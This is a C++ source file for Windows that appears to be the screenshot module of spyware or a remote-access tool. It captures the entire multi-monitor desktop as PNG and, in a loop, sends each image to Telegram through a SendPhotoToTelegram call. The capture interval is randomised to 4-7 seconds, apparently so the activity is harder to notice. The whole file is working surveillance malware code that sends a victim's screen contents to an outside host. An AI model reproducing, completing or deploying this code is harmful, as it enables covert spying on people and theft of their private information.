#include "../include/screenshot.h"
#include "../include/telegram.h"

BYTE* capScr(DWORD* outSize) {
    *outSize = 0;

    // Support virtual desktop (multi-monitor setup)
    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);

    if (width == 0 || height == 0) {
        x = 0; y = 0;
        width = GetSystemMetrics(SM_CXSCREEN);
        height = GetSystemMetrics(SM_CYSCREEN);
    }
    if (width == 0 || height == 0) return NULL;

    HDC hdcScreen = GetDC(NULL);
    if (!hdcScreen) return NULL;

    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);

    if (!hdcMem || !hBitmap) {
        if (hBitmap) DeleteObject(hBitmap);
        if (hdcMem) DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        return NULL;
    }

    HGDIOBJ hOld = SelectObject(hdcMem, hBitmap);
    BOOL blitSuccess = BitBlt(hdcMem, 0, 0, width, height, hdcScreen, x, y, SRCCOPY);

    BYTE* buffer = NULL;
    if (blitSuccess) {
        Bitmap bitmap(hBitmap, NULL);
        if (bitmap.GetLastStatus() == Ok) {
            IStream* pStream = NULL;
            if (CreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
                CLSID pngClsid;
                CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &pngClsid);
                if (bitmap.Save(pStream, &pngClsid, NULL) == Ok) {
                    STATSTG st = {0};
                    pStream->Stat(&st, STATFLAG_NONAME);
                    DWORD size = (DWORD)st.cbSize.QuadPart;
                    if (size > 0) {
                        buffer = (BYTE*)malloc(size);
                        if (buffer) {
                            LARGE_INTEGER li = {0};
                            pStream->Seek(li, STREAM_SEEK_SET, NULL);
                            ULONG bytesRead = 0;
                            pStream->Read(buffer, size, &bytesRead);
                            if (bytesRead == size) {
                                *outSize = size;
                            } else {
                                free(buffer);
                                buffer = NULL;
                            }
                        }
                    }
                }
                pStream->Release();
            }
        }
    }

    SelectObject(hdcMem, hOld);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);

    return buffer;
}

DWORD WINAPI ScreenshotThread(LPVOID lpParam) {
    CoInitialize(NULL);
    GdiplusStartupInput gdiStartup;
    GdiplusStartup(&g_gdiplusToken, &gdiStartup, NULL);
    srand(GetTickCount());

    while (g_running) {
        DWORD size = 0;
        BYTE* data = capScr(&size);
        if (data && size > 0) {
            SendPhotoToTelegram(data, size);
            free(data);
        }
        // Variable capture interval (4 - 7 seconds)
        int wait = 4000 + (rand() % 3000);
        for (int i = 0; i < wait / 500 && g_running; i++) Sleep(500);
    }

    GdiplusShutdown(g_gdiplusToken);
    CoUninitialize();
    return 0;
}
